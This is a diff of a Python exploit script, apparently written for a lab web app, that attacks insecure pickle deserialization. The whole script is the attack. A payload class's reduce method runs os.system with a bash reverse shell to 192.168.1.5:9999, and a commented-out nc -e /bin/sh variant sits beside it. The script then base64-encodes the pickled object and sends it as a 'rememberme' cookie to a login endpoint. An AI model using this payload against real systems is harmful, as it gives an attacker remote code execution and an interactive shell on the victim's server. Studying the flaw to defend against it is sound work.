@@ -6,7 +6,6 @@
 
 import pickle, base64, os, requests
 
-
 #This is the class that the web application serialize using pickle 
 class usr:
     def __init__(self, username, password):
@@ -57,7 +56,6 @@ class payload(object):
     #return (os.system,(f"nc -nv 192.168.1.5 9999 -e /bin/sh",))
     return (os.system,(f"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/9999 0>&1'",))
 
-
 deserialpayload = payload()
 serialpayload = pickle.dumps(deserialpayload)
 rememberme = base64.b64encode(serialpayload)
@@ -65,14 +63,10 @@ print("So our final base64 encoded pickle serialized payload is the one below:")
 rememberme = rememberme.decode('utf-8')
 print(rememberme)
 
-
 #We will send it to the application. In our case the app is running at http://127.0.0.1:5000
 # Dont forget the nc -nlvp 9999
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-
-
 target = "http://127.0.0.1:5000/login"
-
 cookies = {"rememberme":rememberme}
 
 r = requests.get(target, verify=False, proxies=proxies, cookies=cookies)
